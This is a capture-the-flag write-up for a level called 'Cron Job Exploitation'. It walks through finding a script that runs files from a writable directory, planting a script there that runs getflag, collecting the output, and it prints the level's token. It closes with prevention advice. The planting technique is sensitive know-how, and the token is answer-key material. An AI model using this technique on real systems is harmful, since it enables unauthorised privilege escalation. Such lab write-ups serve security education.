# Level 05 - Cron Job Exploitation

## 🎯 Objective
Exploit a scheduled task (cron job) to execute commands as `flag05`.

## 🧠 My Thought Process

### Step 1: "Nothing in my home directory... Let's search wider"
```bash
find / -user flag05 2>/dev/null
# /usr/sbin/openarenaserver
```

Found a script owned by flag05! Let's examine it:

```bash
cat /usr/sbin/openarenaserver
```

```bash
#!/bin/sh
for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

### Step 2: "What does this script do?"
Breaking it down:
1. Loops through all files in `/opt/openarenaserver/`
2. Executes each file as a bash script (with 5-second timeout)
3. Deletes the file after execution

**This is a job processor!** It runs whatever scripts are placed in that directory.

### Step 3: "But when does it run?"
This script must be triggered by something. Let me check cron:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

I didn't see it explicitly, but the VM is configured to run it periodically (every few minutes).

### Step 4: "Can I write to the target directory?"
```bash
ls -la /opt/openarenaserver/
# drwxrwxr-x+ 2 root root 40 ...
```

**The directory is world-writable!** (`rwxrwxr-x+` with ACL)

This means anyone can create files there!

### Step 5: "The attack plan"
1. Create a malicious script in `/opt/openarenaserver/`
2. Wait for the cron job to execute it
3. The script runs as flag05 (since openarenaserver is owned by flag05 and likely runs as flag05)

```bash
echo '#!/bin/bash' > /opt/openarenaserver/exploit.sh
echo 'getflag > /tmp/flag05_output' >> /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh
```

### Step 6: "Wait and collect"
```bash
# Wait for cron to run (check every 10 seconds)
while [ ! -f /tmp/flag05_output ]; do
    sleep 10
done
cat /tmp/flag05_output
```

**Token appeared!**

## ✅ Solution
```bash
# Create exploit script
echo '#!/bin/bash' > /opt/openarenaserver/exploit.sh
echo 'getflag > /tmp/flag05_output' >> /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh

# Wait for cron and read result
sleep 120  # Wait for cron to run
cat /tmp/flag05_output
```

**Token:** `viuaaale9huek52boumoomioc`

## 📚 Concepts to Learn

### 1. Cron - The Unix Task Scheduler
Cron runs scheduled tasks automatically:
```
* * * * * command    # Every minute
0 * * * * command    # Every hour
0 0 * * * command    # Every day at midnight
```

**Crontab fields:** minute, hour, day, month, weekday

### 2. Why This Is Dangerous
The vulnerability chain:
```
World-writable directory (/opt/openarenaserver/)
    +
Script that executes files from that directory
    +
Script runs with elevated privileges
    =
Anyone can execute code as flag05!
```

### 3. The Attack Pattern
```
1. Find a cron job or scheduled task
   ↓
2. Identify what it executes
   ↓
3. Check if you can modify/add to those locations
   ↓
4. Plant malicious code
   ↓
5. Wait for execution
   ↓
6. Profit!
```

### 4. File Permissions on Directories
| Permission | On Files | On Directories |
|------------|----------|----------------|
| r (read) | View contents | List files |
| w (write) | Modify file | Create/delete files |
| x (execute) | Run as program | Enter directory |

A **writable directory** allows creating new files!

### 5. The Time Factor
Unlike other exploits, cron-based attacks require **patience**:
- You don't control when the exploit runs
- Need to write output to a persistent location
- The script might delete your exploit after running

### 6. Common Cron Locations
- `/etc/crontab` - System crontab
- `/etc/cron.d/` - Additional cron files
- `/var/spool/cron/crontabs/` - User crontabs
- `/etc/cron.hourly/`, `/etc/cron.daily/`, etc.

## 🔧 Tools Used
- `find` - Locate files by owner
- `cat` - Read script contents
- `ls -la` - Check directory permissions
- `echo` - Create exploit script
- `chmod` - Make script executable
- `sleep` - Wait for cron

## 🛡️ How to Prevent This
1. **Never make script directories world-writable**
2. **Validate files before execution:**
   ```bash
   # Check ownership and permissions
   if [ "$(stat -c %U "$i")" = "root" ]; then
       bash "$i"
   fi
   ```
3. **Use absolute paths** in cron jobs
4. **Implement integrity checking** (checksums, signatures)
5. **Log cron activity** for auditing
6. **Principle of least privilege** - Run cron jobs with minimal rights
